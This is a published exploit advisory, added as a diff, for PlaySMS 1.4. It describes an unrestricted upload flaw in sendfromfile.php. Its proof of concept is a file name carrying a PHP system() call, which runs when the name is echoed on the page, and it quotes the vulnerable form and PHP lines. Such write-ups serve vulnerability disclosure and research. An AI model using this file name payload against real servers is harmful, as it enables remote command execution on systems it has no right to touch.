@@ -1,0 +1,54 @@
+# Exploit Title: PlaySMS 1.4 Code Execution using $filename and Unrestricted File Upload in sendfromfile.php
+# Date: 14-05-2017
+# Software Link: https://playsms.org/download/
+# Version: 1.4
+# Exploit Author: Touhid M.Shaikh
+# Contact: http://twitter.com/touhidshaikh22
+# Website: http://touhidshaikh.com/
+# Category: webapps
+ 
+1. Description
+   
+Unrestricted File Upload: 
+	Any registered user can upload any file because of not proper Validation of file in sendfromfile.php
+
+Code Execution using $filename 
+	Now We know sendfromfile.php accept any file extension and just read content not stored in server. But there is bug when user upload example: mybackdoor.php server accept happily  but not store in any folder so our shell is useless. But if User change the file name to "mybackdoor.php" to "<?php system('uname -a'); dia();?>.php"  den server check for file and set some perameter $filename="<?php system('uname -a'); dia();?>.php" , U can see code below and display $filename on page.
+
+ For More Details : www.touhidshaikh.com/blog/
+   
+2. Proof of Concept
+ 
+Login as regular user (created using index.php?app=main&inc=core_auth&route=register):
+
+Go to : http://127.0.0.1/playsms/index.php?app=main&inc=feature_sendfromfile&op=list
+ 
+
+ This is Form.
+----------------------------Form for upload CSV file ----------------------
+<form action=\"index.php?app=main&inc=feature_sendfromfile&op=upload_confirm\" enctype=\"multipart/form-data\" method=\"post\">
+" . _CSRF_FORM_ . "
+<p>" . _('Please select CSV file') . "</p>
+<p><input type=\"file\" name=\"fncsv\"></p>
+<p class=help-block>" . _('CSV file format') . " : " . $info_format . "</p>
+<p><input type=checkbox name=fncsv_dup value=1 checked> " . _('Prevent duplicates') . "</p>
+<p><input type=\"submit\" value=\"" . _('Upload file') . "\" class=\"button\"></p>
+</form>
+------------------------------Form ends ---------------------------
+
+
+-------------PHP code for set parameter ---------------------------
+
+	case 'upload_confirm':
+		$filename = $_FILES['fncsv']['name'];
+
+------------------------------php code ends ---------------------------
+
+
+$filename will be visible on page:
+----------------------Vulnerable perameter show ----------------------
+
+line 123 : $content .= _('Uploaded file') . ': ' . $filename . '<p />';
+
+----------------------------------------------------------------------
+ 
